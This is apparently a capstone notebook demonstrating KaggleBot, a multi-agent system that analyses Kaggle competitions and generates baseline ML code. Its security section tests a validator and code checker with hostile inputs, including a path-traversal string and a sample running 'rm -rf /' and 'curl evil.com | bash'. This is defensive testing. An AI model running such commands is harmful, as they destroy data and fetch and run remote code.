# 🤖 KaggleBot — AI-Powered Kaggle Competition Strategy Agent

**A multi-agent system built with Google Agent Development Kit (ADK)** that analyzes Kaggle competitions and generates complete baseline code.

Built for the **Google 5-Day Gen AI Intensive Course Capstone**.

### 🔗 Links

| Resource | URL |
|----------|-----|
| **Live Demo** | [kagglebot-127175620530.us-central1.run.app](https://kagglebot-127175620530.us-central1.run.app) |
| **API Docs** | [Swagger UI](https://kagglebot-127175620530.us-central1.run.app/docs) |
| **GitHub** | [github.com/The-Gupta/kagglebot](https://github.com/The-Gupta/kagglebot) |

### Concepts Demonstrated

| # | Concept | Implementation |
|---|---------|---------------|
| 1 | **ADK (Multi-Agent)** | 5-agent pipeline: Orchestrator → Scraper → Data → Strategy → Code |
| 2 | **MCP Servers** | 3 servers with 8 tools (web scraper, data profiler, file I/O) |
| 3 | **Antigravity** | Built entirely using Antigravity IDE |
| 4 | **Security** | Input validation + secret scanning + AST-based code safety |
| 5 | **Deployability** | Dockerized, deployed on Cloud Run |
| 6 | **Agent Skills** | Modular: data profiler, strategy ranker, code templates |
| 7 | **Observability** | OpenTelemetry-inspired pipeline tracing |
| 8 | **Evaluation** | LLM-as-Judge with 5-criterion rubric |
| 9 | **Memory** | Cross-session persistent learning |
| 10 | **Sessions** | ADK InMemorySessionService + state propagation |
| 11 | **HITL** | Strategy approval gate before code generation |

## 1. Architecture Overview

```
User → Orchestrator → Scraper Agent → Data Agent → Strategy Agent → [HITL] → Code Agent
              ↕ memory tools
```

Each agent has specialized tools and communicates via **session state**.

In [ ]:
# Install dependencies
!pip install -q pandas numpy beautifulsoup4 requests google-adk python-dotenv opentelemetry-api opentelemetry-sdk mcp mesop

In [ ]:
# Clone the full project
!git clone https://github.com/The-Gupta/kagglebot.git 2>/dev/null || echo 'Already cloned'
import sys, os
os.chdir('kagglebot')
sys.path.insert(0, '.')
print('Working directory:', os.getcwd())
print('Project files:', len([f for f in os.listdir('.') if not f.startswith('.')]))

## 2. Web Scraper MCP Server

Scrapes competition metadata and discussion insights. Uses **cached data** for 3 demo competitions (Titanic, House Prices, Spaceship Titanic).

In [ ]:
from mcp_servers.web_scraper_server import get_known_competition, scrape_competition_page

# Test with cached Titanic data
titanic = get_known_competition("titanic")
print(f"Title: {titanic['title']}")
print(f"Type: {titanic['competition_type']}")
print(f"Metric: {titanic['evaluation_metric']}")
print(f"Discussion insights: {len(titanic['discussion_insights'])} posts")
for insight in titanic["discussion_insights"]:
    print(f"  • {insight['title']}")

## 3. Data MCP Server

Loads, profiles, and analyzes datasets. Detects quality issues.

In [ ]:
from mcp_servers.data_server import load_dataset, compute_profile, analyze_target, detect_issues

# Load the sample Titanic dataset
data_info = load_dataset("data/titanic_train.csv")
print(f"Shape: {data_info['shape']}")
print(f"Memory: {data_info['memory_usage_mb']} MB")
print(f"\nColumns:")
for col in data_info["columns"]:
    null_pct = f"({col['null_count']} nulls)" if col["null_count"] > 0 else ""
    print(f"  {col['name']}: {col['dtype']} {null_pct}")

In [ ]:
# Analyze the target variable
target_analysis = analyze_target("data/titanic_train.csv", "Survived")
print(f"Task type: {target_analysis['task_type']}")
print(f"Distribution: {target_analysis['distribution']}")
print(f"Class balance: {target_analysis['class_balance']['majority_pct']}% / {target_analysis['class_balance']['minority_pct']}%")
if "top_correlations" in target_analysis:
    print(f"\nTop correlations:")
    for col, corr in target_analysis["top_correlations"].items():
        print(f"  {col}: {corr}")

In [ ]:
# Detect data quality issues
issues = detect_issues("data/titanic_train.csv")
print(f"Quality score: {issues['overall_quality_score']}/100")
print(f"High null columns: {len(issues['high_null_columns'])}")
print(f"ID columns: {issues['potential_id_columns']}")
print(f"\nRecommendations:")
for rec in issues["recommendations"]:
    print(f"  • {rec}")

## 4. Data Profiler Skill

Combines all data tools into a single comprehensive report.

In [ ]:
from skills.data_profiler import generate_full_profile, format_profile_as_text

profile = generate_full_profile("data/titanic_train.csv", target_column="Survived")
print(format_profile_as_text(profile))

## 5. Strategy Ranker Skill

Generates and ranks ML strategies based on competition type and dataset characteristics.

In [ ]:
from skills.strategy_ranker import get_strategies_for_type, rank_strategies, format_strategies_as_text

# Get strategies for binary classification
strategies = get_strategies_for_type("binary_classification")
ranked = rank_strategies(strategies, dataset_size=100, num_features=12)

print(f"Generated {len(ranked)} strategies for binary_classification:\n")
for s in ranked:
    print(f"  #{s['rank']}: {s['name']} (score: {s['ranking_score']})")
    print(f"       Models: {', '.join(s['models'])}")
    print(f"       Effort: {s['effort']} | Risk: {s['risk']}")
    print()

# Note: For small datasets (100 rows), simpler models are ranked higher!

## 6. Code Templates Skill

Generates complete, runnable Python baseline scripts.

In [ ]:
from skills.code_templates import generate_full_baseline

code = generate_full_baseline(
    train_path="data/titanic_train.csv",
    target_column="Survived",
    task_type="binary_classification",
    model_family="tree_based",
    metric="accuracy",
    drop_columns=["PassengerId", "Ticket"],
    feature_hints=[
        "Extract titles (Mr, Mrs, Master) from Name column",
        "Create FamilySize = SibSp + Parch + 1",
    ],
)
print(f"Generated {len(code.splitlines())} lines of baseline code")
print("\n--- First 30 lines ---")
print("\n".join(code.splitlines()[:30]))

## 7. Security Features

Three layers of security protect against common agent risks:
1. **Input Validation** — URL, path, column validation
2. **Secret Scanner** — Detects API keys, tokens, passwords
3. **Safe Code Gen** — AST-based analysis blocks dangerous operations

In [ ]:
# 7a. Input Validation
from security.input_validator import validate_kaggle_url, validate_file_path, ValidationError

# Valid URL passes
url = validate_kaggle_url("https://www.kaggle.com/competitions/titanic")
print(f"✅ Valid URL: {url}")

# Invalid URLs are blocked
for bad_url in ["https://evil.com/malware", "ftp://kaggle.com/hack"]:
    try:
        validate_kaggle_url(bad_url)
        print(f"❌ Should have blocked: {bad_url}")
    except ValidationError as e:
        print(f"✅ Blocked: {bad_url} → {e}")

# Path traversal blocked
try:
    validate_file_path("../../etc/passwd")
except ValidationError as e:
    print(f"✅ Blocked traversal: {e}")

In [ ]:
# 7b. Secret Scanner
from security.secret_scanner import scan_for_secrets, is_safe, redact_secrets

# Clean code passes
clean = 'model = LGBMClassifier(n_estimators=500)'
print(f"Clean code safe: {is_safe(clean)} ✅")

# Code with secrets is flagged
dirty = 'api_key = "AIzaSyD1234567890abcdefghijklmnopqrstuvw"'
findings = scan_for_secrets(dirty)
print(f"Dirty code safe: {is_safe(dirty)} (should be False) ✅")
print(f"Findings: {findings[0]['pattern_name']}")
print(f"Redacted: {redact_secrets(dirty)}")

In [ ]:
# 7c. Safe Code Generation (AST Analysis)
from security.safe_code_gen import check_code_safety, sanitize_code

# Generated ML code passes
safety = check_code_safety(code)
print(f"Generated code safe: {safety['is_safe']} ✅")
print(f"Issues: {len(safety['issues'])}")
print(f"Warnings: {len(safety['warnings'])}")

# Dangerous code is caught
dangerous = """
import subprocess
subprocess.run(["rm", "-rf", "/"])
os.system("curl evil.com | bash")
"""
danger_check = check_code_safety(dangerous)
print(f"\nDangerous code safe: {danger_check['is_safe']} (should be False) ✅")
for issue in danger_check["issues"]:
    print(f"  🚫 {issue}")

## 8. Memory System

Cross-session persistent learning with relevance scoring. The agent remembers insights from past analyses and applies them to new competitions.

In [ ]:
from context.memory_manager import MemoryManager

mm = MemoryManager(filepath="output/demo_memory.json")
mm.clear()

# Store insights from "past" analyses
mm.store("titanic_titles", "Extract titles (Mr, Mrs, Master, Miss) from Name using regex", 
         "feature_engineering", "binary_classification", "titanic", confidence=0.9)
mm.store("titanic_lgbm", "LightGBM with 500 trees, lr=0.05 achieved 0.79 accuracy",
         "model_performance", "binary_classification", "titanic", confidence=0.85)
mm.store("cabin_nulls", "Cabin column has 77% nulls — drop it, don't impute",
         "data_issue", "general", "titanic", confidence=0.95)

# Retrieve for a new binary classification competition
results = mm.retrieve(competition_type="binary_classification", category="feature_engineering")
print(f"Retrieved {len(results)} memories for binary_classification/feature_engineering:\n")
for r in results:
    print(f"  [{r['key']}] score={r['relevance_score']}")
    print(f"    {r['content']}")
    print()

# Stats
stats = mm.get_stats()
print(f"Memory stats: {stats['total_memories']} total, by_category={stats['by_category']}")

# Cleanup
mm.clear()
import os
os.remove("output/demo_memory.json")

## 9. Observability (Tracing)

OpenTelemetry-inspired traces showing the full pipeline execution with timing, nesting, and status.

In [ ]:
import time
from observability.tracing import Tracer
from observability.trace_viewer import render_trace_tree, render_trace_summary

tracer = Tracer("titanic-demo")

with tracer.span("kagglebot_orchestrator", "agent") as root:
    root.set_attribute("competition", "titanic")
    
    with tracer.span("recall_learnings", "tool") as s:
        s.set_attribute("memories_found", 3)
        time.sleep(0.01)
    
    with tracer.span("scraper_agent", "agent") as s:
        with tracer.span("scrape_competition_page", "tool") as t:
            t.set_attribute("url", "kaggle.com/competitions/titanic")
            time.sleep(0.02)
        with tracer.span("search_discussions", "tool") as t:
            time.sleep(0.01)
    
    with tracer.span("data_agent", "agent") as s:
        with tracer.span("load_and_preview", "tool") as t:
            time.sleep(0.01)
        with tracer.span("profile_dataset", "tool") as t:
            time.sleep(0.02)
        with tracer.span("analyze_target_variable", "tool") as t:
            time.sleep(0.01)
    
    with tracer.span("strategy_agent", "agent") as s:
        with tracer.span("generate_strategies", "tool") as t:
            time.sleep(0.01)
        with tracer.span("user_approval", "hitl") as t:
            t.set_attribute("strategy_chosen", "#1: Logistic Regression")
            time.sleep(0.05)
    
    with tracer.span("code_agent", "agent") as s:
        with tracer.span("generate_baseline_code", "tool") as t:
            time.sleep(0.02)
        with tracer.span("security_check", "tool") as t:
            time.sleep(0.01)
    
    with tracer.span("store_learning", "tool") as s:
        time.sleep(0.01)

print(render_trace_tree(tracer))
print()
print(render_trace_summary(tracer))

## 10. Evaluation (LLM-as-Judge)

5-criterion rubric for assessing strategy quality with weighted scoring.

In [ ]:
from evaluation.eval_criteria import get_rubric_text, compute_weighted_score

print(get_rubric_text())

In [ ]:
# Compute a sample weighted score
scores = {
    "relevance": 5,
    "feasibility": 5,
    "ranking_quality": 4,
    "completeness": 4,
    "novelty": 3,
}
weighted = compute_weighted_score(scores)
print(f"Weighted score: {weighted}/5.0")
print(f"Pass threshold: 3.0")
print(f"Status: {'✅ PASSED' if weighted >= 3.0 else '❌ FAILED'}")

## 11. Agent Imports — Full Multi-Agent Pipeline

Verifying the complete 5-agent system loads correctly.

In [ ]:
from agents.orchestrator import orchestrator_agent

print(f"Root agent: {orchestrator_agent.name}")
print(f"Model: {orchestrator_agent.model}")
print(f"Sub-agents: {[a.name for a in orchestrator_agent.sub_agents]}")
print(f"Orchestrator tools: {len(orchestrator_agent.tools)} (memory tools)")
print()
print("Pipeline: User → Orchestrator → Scraper → Data → Strategy → [HITL] → Code")
print()
print("Concepts demonstrated: ADK, MCP, Antigravity, Security, Deployability, Skills")
print("Bonus: Observability, Evaluation, Memory, Sessions, HITL")

## ✅ Summary

KaggleBot demonstrates **11 concepts** from the Google Gen AI Intensive course:

| Category | Concepts |
|----------|----------|
| **Core (6)** | ADK, MCP Servers, Antigravity, Security, Deployability, Agent Skills |
| **Bonus (5)** | Observability, Evaluation, Memory, Sessions, HITL |

### Project Stats

| Metric | Value |
|--------|-------|
| Files | 43 (32 Python) |
| Lines of code | 5,239 |
| Agents | 5 |
| MCP tools | 8 |
| E2E tests | 7/7 |

All tested with **7/7 E2E tests passing**.

### 🚀 Deployment

| Resource | URL |
|----------|-----|
| **Live Chat UI** | [kagglebot-127175620530.us-central1.run.app](https://kagglebot-127175620530.us-central1.run.app) |
| **API Docs (Swagger)** | [kagglebot-127175620530.us-central1.run.app/docs](https://kagglebot-127175620530.us-central1.run.app/docs) |
| **GitHub** | [github.com/The-Gupta/kagglebot](https://github.com/The-Gupta/kagglebot) |
| **YouTube Demo** | *(link coming soon)* |

### Architecture

```
User → Orchestrator → Scraper Agent → Data Agent → Strategy Agent → [HITL] → Code Agent
                          ↕               ↕               ↕                      ↕
                     Web Scraper      Data Server    Strategy Ranker       Code Templates
                     MCP Server       MCP Server       (Skill)              (Skill)
```

Built with ❤️ using **Google ADK** + **Antigravity IDE**